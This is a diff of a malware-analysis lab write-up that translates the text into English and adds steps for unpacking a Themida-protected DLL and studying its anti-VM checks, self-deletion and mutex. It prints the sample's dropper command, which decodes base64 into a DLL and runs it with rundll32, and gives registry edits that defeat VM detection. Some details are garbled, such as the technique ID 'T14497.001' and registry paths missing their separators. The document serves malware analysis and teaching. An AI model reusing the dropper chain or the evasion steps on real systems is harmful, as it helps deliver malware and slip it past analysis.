@@ -386,7 +386,7 @@ R:A358AC6BE54B74AA1AF1D5FBFC26AA5D8EF714A042CC3AAFDF8CC0F777D9C773
 The files downloaded in this stage are saved in a single, well-known location. What is the environment variable for this folder?
 ```
 
-Apos descriptografar, temos:
+After decrypting, we have:
 
 ```powershell
 cscript.exe .\stage2.vbs
@@ -405,7 +405,7 @@ cmd /c cd /d %localappdata% && findstr /b "TVqQAAMAAA" "
 cmd /c cd /d %localappdata% && findstr /b "TVqQAAMAAA" "">1.log && powershell -Command "[IO.File]::WriteAllBytes('sys.dll', [Convert]::FromBase64String((Get-Content '1.log' -Raw)))" && del 1.log && rundll32 sys.dll,h
 ```
 
-Nitidamente, os arquivos baixados sao passados para a variavel de ambiente **%localappdata%**.
+Clearly, the downloaded files are passed to the environment variable **%localappdata%**.
 
 R: %localappdata%
 
@@ -503,11 +503,11 @@ R: sys.dll
 Which Windows utility is used to achieve final execution?
 ```
 
-Para executar manualmente uma dll no Windows, utiliza-se **rundll32.exe** que encontrase adicionada ao PATH dos sistema.
+To manually run a DLL on Windows, you use **rundll32.exe**, which is found added to the system PATH.
 
 **Utilizacao:** rundll32.exe (DLLname)
 
-No final do comando powershell do malware temos a execucao ela: 
+At the end of the malware's PowerShell command, we have its execution:
 
 ```powershell
 rundll32 sys.dll,h
@@ -669,3 +669,191 @@ R: DE7FE8842C46BC5C2F723DEE3D4B07043D531D067C06CAA3263000BCC41AECDD
 Based on the static analysis tool, what is the specific commercial protector/packer used on the malware?
 ```
 
+At the end of the past internship, it resulted in a 'sys.dll' file, which we are now going to dive into.
+
+![alt text](SilentSerpent/VTFyo13.png)
+
+R: Themida
+
+---
+
+## 4.1.2 Question 2
+```
+What is the original filename the author used for the malware before it was packed and renamed to 'sys.dll'?
+```
+
+Since we know that Themida was used for packing, I used the unlicense tool to be able to unpack it, available at https://github.com/ergrelet/unlicense.
+
+In my case, using Flare-VM on VirtualBox, I had a problem: Themida detects VirtualBox using a hardware-related registry value that is different. We can see it in the execution:
+
+```powershell
+.\unlicense.exe sys.dll
+INFO - Detected packer version: 2.x
+frida-agent: Setting up OEP tracing for "sys.dll"
+frida-agent: Target module has been loaded (thread #3488) ...
+frida-agent: Exception handler registered
+ERROR - Original entry point wasn't reached before timeout
+Traceback (most recent call last):
+  File "unlicense\application.py", line 90, in run_unlicense
+SystemExit: 4
+
+During handling of the above exception, another exception occurred:
+
+frida.InvalidOperationError: script has been destroyed
+[5020] Failed to execute script '__main__' due to unhandled exception!
+```
+
+The following PowerShell commands show the queried values:
+
+```powershell
+(Get-ItemProperty -Path "HKLM:\HARDWARE\Description\System").VideoBiosVersion
+Oracle VirtualBox Version 7.2.4 VGA BIOS
+Oracle VirtualBox Version 7.2.4 VGA BIOS
+Oracle VirtualBox Version 7.2.4
+Oracle VirtualBox Version 7.2.4
+
+(Get-ItemProperty -Path "HKLM:\HARDWARE\Description\System").SystemBiosVersion
+VBOX   - 1
+```
+
+To get around this detection, the registry values can be changed to remove the VirtualBox identifiers and replace them with any descriptions:
+
+```powershell
+Set-ItemProperty -Path "HKLM:\HARDWARE\Description\System" -Name "SystemBiosVersion" -Value "Google"
+
+Set-ItemProperty -Path "HKLM:\HARDWARE\Description\System" -Name "VideoBiosVersion" -Value "Google"
+```
+
+> **Note:** This operation requires administrator privileges, as the registry key is protected.
+
+After making the change to these values, the VirtualBox fingerprint is no longer present, preventing Themida from detecting the environment.
+
+Now we will go back with the unlicense tool to successfully unpack it.
+
+```powershell
+.\unlicense.exe .\sys.dll
+INFO - Detected packer version: 2.x
+frida-agent: Setting up OEP tracing for "sys.dll"
+frida-agent: Target module has been loaded (thread #4180) ...
+frida-agent: Exception handler registered
+frida-agent: OEP found (thread #4180): 0x7ff991cf5a9c
+INFO - OEP reached: OEP=0x7ff991cf5a9c BASE=0x7ff991cf0000 DOTNET=False
+INFO - Looking for wrapped imports ...
+INFO - Potential import wrappers found: 0
+INFO - Resolving imports ...
+INFO - Imports resolved: 106
+INFO - Generated the fake IAT at 0x7ff991ce0000, size=0x350
+INFO - Patching call and jmp sites ...
+INFO - Dumping PE with OEP=0x7ff991cf5a9c ...
+INFO - Fixing dump ...
+INFO - Rebuilding PE ...
+INFO - Output file has been saved at 'unpacked_sys.dll'
+```
+
+Now we have the file 'unpacked_sys.dll', in the search for strings that might show us the supposed old name of the file, we have:
+
+![alt text](SilentSerpent/KzSOOr0.png)
+
+R: baby.dll
+
+---
+
+## 4.1.3 Question 3
+```
+Following the unpacking of sys.dll, what is the first MITRE ATT&CK sub-technique invoked by the malware using its export function?
+```
+
+In our unpacked .dll file, in its exported functions, we can see something:
+
+![alt text](SilentSerpent/Arap08k.png)
+
+We can analyze this export code within IDA. When we see the first code block, we can already assume that we have an Anti-VM function used by the malware.
+
+![alt text](SilentSerpent/NQbwGF7.png)
+
+The 'CreateFileA' function tries to open **.VBoxMiniRdrDN** to check for the existence of VirtualBox. It uses 'RegOpenKeyExA' to look for **SOFTWAREVMware, Inc.VMware Tools**. These checks are used to see if the malware is running in a VM/sandbox.
+
+R: T14497.001
+
+---
+
+## 4.1.4 Question 4
+```
+The malware checks for a Virtual Machine by attempting to open a handle to a specific device driver. What is the name of this device driver?
+```
+
+As shown in the previous question.
+
+R: \\.\VBoxMiniRdrDN
+
+---
+
+## 4.1.5 Question 5
+```
+If the first check fails, the malware checks for another virtual machine environment by querying a specific registry key. Which VM does this key check target?
+```
+
+He does a registry key check where it exists in environments inside VMware.
+
+![alt text](SilentSerpent/1bwCh2s.png)
+
+R: VMware
+
+---
+
+## 4.1.6 Question 6
+```
+When the malware detects it is running inside a sandbox, it uses an environment variable to locate a system utility and constructs a command to delete itself. Which system utility executable does it resolve and invoke?
+```
+
+After executing a search for a registry key related to VMware, it does the check, 'test eax, eax'. If eax = 0, then it does 'jz short loc_7FF991CF1C52', where we will analyze what gets executed.
+
+![alt text](SilentSerpent/TmkPvpx.png)
+
+At 'loc_7FF991CF1C52' we have a call to a subroutine, where we see the following code:
+
+![alt text](SilentSerpent/sUy8ejL.png)
+
+Here he uses the 'GetEnvironmentVariableA' function, which retrieves the content of the specified variable from the calling process's environment block.
+
+R: C:\Windows\System32\cmd.exe
+
+---
+
+## 4.1.7 Question 7
+```
+If no Virtual Machine is detected, the malware creates a global synchronization object to ensure only one instance of the malware runs. What is the name of this object (Mutex)?
+```
+
+If no use of a VM is detected, the following code block creates a Mutex with the 'CreateMutexA' function named **rggmfm**.
+
+![alt text](SilentSerpent/DADAEsdaeE.png)
+
+---
+
+## 4.1.8 Question 8
+```
+The malware spawns a new thread. What is the value used to set the new thread's priority to its lowest possible level?
+```
+
+When we look at the following code block of creating a Thread with the 'CreateThread' function, and then setting its priority.
+
+```c
+Thread = CreateThread(
+             lpThreadAttributes: nullptr,
+             dwStackSize: 0,
+             lpStartAddress: (LPTHREAD_START_ROUTINE)StartAddress,
+             lpParameter: nullptr,
+             dwCreationFlags: 0,
+             lpThreadId: nullptr);
+SetThreadPriority(hThread: Thread, nPriority: 0xFFFFFFF1);
+```
+
+R: 0xFFFFFFF1
+
+---
+
+## 4.1.9 Question 9
+```
+The malware retrieves a directory and appends a suffix to it. What is the full path it constructs in code?
+```
